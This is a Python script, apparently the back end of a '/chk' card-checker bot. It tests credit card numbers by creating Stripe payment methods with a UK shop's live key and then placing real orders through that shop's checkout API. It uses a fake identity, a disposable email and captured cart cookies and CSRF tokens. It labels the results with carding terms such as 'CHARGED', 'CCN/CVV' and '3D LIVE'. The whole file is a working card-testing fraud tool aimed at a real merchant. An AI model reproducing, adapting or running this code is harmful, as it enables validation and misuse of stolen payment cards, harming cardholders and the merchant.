

def categorize_response(response):
    response = response.lower()

    charged_keywords = [
        "succeeded", "payment-success", "successfully", "thank you for your support",
        "your card does not support this type of purchase", "thank you",
        "membership confirmation", "/wishlist-member/?reg=", "thank you for your payment",
        "thank you for membership", "payment received", "your order has been received",
        "purchase successful"
    ]
    
    insufficient_keywords = [
        "insufficient funds", "insufficient_funds", "payment-successfully"
    ]
    
    auth_keywords = [
        "mutation_ok_result" , "requires_action"
    ]

    ccn_cvv_keywords = [
        "incorrect_cvc", "invalid cvc", "invalid_cvc", "incorrect cvc", "incorrect cvv",
        "incorrect_cvv", "invalid_cvv", "invalid cvv", ' "cvv_check": "pass" ',
        "cvv_check: pass", "security code is invalid", "security code is incorrect",
        "zip code is incorrect", "zip code is invalid", "card is declined by your bank",
        "lost_card", "stolen_card", "transaction_not_allowed", "pickup_card"
    ]

    live_keywords = [
        "authentication required", "three_d_secure", "3d secure", "stripe_3ds2_fingerprint"
    ]

    declined_keywords = [
        "declined", "do_not_honor", "generic_decline", "decline by your bank",
        "expired_card", "your card has expired", "incorrect_number",
        "card number is incorrect", "processing_error", "service_not_allowed",
        "lock_timeout", "card was declined", "fraudulent"
    ]

    if any(kw in response for kw in charged_keywords):
        return "CHARGED 🔥"
    elif any(kw in response for kw in ccn_cvv_keywords):
        return "CCN/CVV ✅"
    elif any(kw in response for kw in live_keywords):
        return "3D LIVE ✅"
    elif any(kw in response for kw in insufficient_keywords):
        return "INSUFFICIENT FUNDS 💰"
    elif any(kw in response for kw in auth_keywords):
        return "STRIPE AUTH ☑️ "
    elif any(kw in response for kw in declined_keywords):
        return "DECLINED ❌"
    else:
        return "UNKNOWN STATUS 👾"


def check_card(cc, mm, yy):
    try:
        # Your original headers for payment method creation
        headers_pm = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        # cvv is missing in /chk command, so send empty or dummy value
        cvv = "000"

        # Prepare the post data with cc, mm, yy, cvv (dummy)
        data_pm = f'billing_details[address][city]=new+york&billing_details[address][country]=US&billing_details[address][line1]=street+1&billing_details[address][line2]=&billing_details[address][postal_code]=10080&billing_details[address][state]=NY&billing_details[name]=lol+mo+mo&billing_details[email]=gihiwix811%40jeanssi.com&type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2F63a7a7cd5b%3B+stripe-js-v3%2F63a7a7cd5b%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.lostincult.co.uk&time_on_page=78615&client_attribution_metadata[client_session_id]=661c78c6-2c49-4e9a-9db9-a0551c3a27b4&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=NA&muid=NA&sid=NA&key=pk_live_51Ie38JEsIQ43RwyJs91epnrYNcltpuhazELwn573AQdQx0r1ZCPx7XmBJwjfZdpHDwtKb9IeHj2aLgAwpxSLDBQO00kPJ1Z7y9&_stripe_account=acct_1Ie38JEsIQ43RwyJ'

        response_pm = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_pm, data=data_pm)
        op = response_pm.json()

        if 'id' not in op:
            # If Stripe API returned error, categorize the raw response text
            raw_response = response_pm.text.lower()
            status = categorize_response(raw_response)
            return f"Response: {raw_response}\nStatus: {status}"

        pm_id = op['id']

        # Order request
        cookies_order = {
            'crumb': 'BbKt0XvZxm4LN2JmMDFlN2FkNThmODQyMDQ5NGRiZDk0OTg4ZDkx',
            'ss_performanceCookiesAllowed': 'true',
            'ss_marketingCookiesAllowed': 'true',
            '_fbp': 'fb.2.1749655856772.378780657934467996',
            'ss_cvr': 'c0d1f81f-6d55-4a8f-a858-996aec0b3f35|1749655918911|1749655918911|1749655918911|1',
            'ss_cvt': '1749655918911',
            'CART': 'VRU_URrnvPRouy-FrAGk9RZG5g_R6Y1x-pNNhidi',
            'hasCart': 'true',
        }

        headers_order = {
            'authority': 'www.lostincult.co.uk',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.lostincult.co.uk',
            'referer': 'https://www.lostincult.co.uk/checkout?cartToken=VRU_URrnvPRouy-FrAGk9RZG5g_R6Y1x-pNNhidi',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-csrf-token': 'BbKt0XvZxm4LN2JmMDFlN2FkNThmODQyMDQ5NGRiZDk0OTg4ZDkx',
        }

        json_order = {
            'email': 'gihiwix811@jeanssi.com',
            'subscribeToList': False,
            'shippingAddress': {
                'id': '',
                'firstName': 'lol mo',
                'lastName': 'mo',
                'line1': 'street 1',
                'line2': '',
                'city': 'new york',
                'region': 'NY',
                'postalCode': '10080',
                'country': 'US',
                'phoneNumber': '13322767084',
            },
            'createNewUser': False,
            'newUserPassword': None,
            'saveShippingAddress': False,
            'makeDefaultShippingAddress': False,
            'customFormData': None,
            'shippingAddressId': None,
            'proposedAmountDue': {
                'decimalValue': '36.99',
                'currencyCode': 'GBP',
            },
            'cartToken': 'VRU_URrnvPRouy-FrAGk9RZG5g_R6Y1x-pNNhidi',
            'paymentToken': {
                'stripePaymentTokenType': 'PAYMENT_METHOD_ID',
                'token': pm_id,
                'type': 'STRIPE',
            },
            'billToShippingAddress': True,
            'billingAddress': {
                'id': '',
                'firstName': 'lol mo',
                'lastName': 'mo',
                'line1': 'street 1',
                'line2': '',
                'city': 'new york',
                'region': 'NY',
                'postalCode': '10080',
                'country': 'US',
                'phoneNumber': '13322767084',
            },
            'savePaymentInfo': False,
            'makeDefaultPayment': False,
            'paymentCardId': None,
            'universalPaymentElementEnabled': True,
        }

        response_order = requests.post('https://www.lostincult.co.uk/api/2/commerce/orders', cookies=cookies_order, headers=headers_order, json=json_order)

        raw_response = response_order.text.lower()
        status = categorize_response(raw_response)
        return f"Response: {raw_response}\nStatus: {status}"

    except Exception as e:
        return f"❌ Error occurred: {str(e)}"
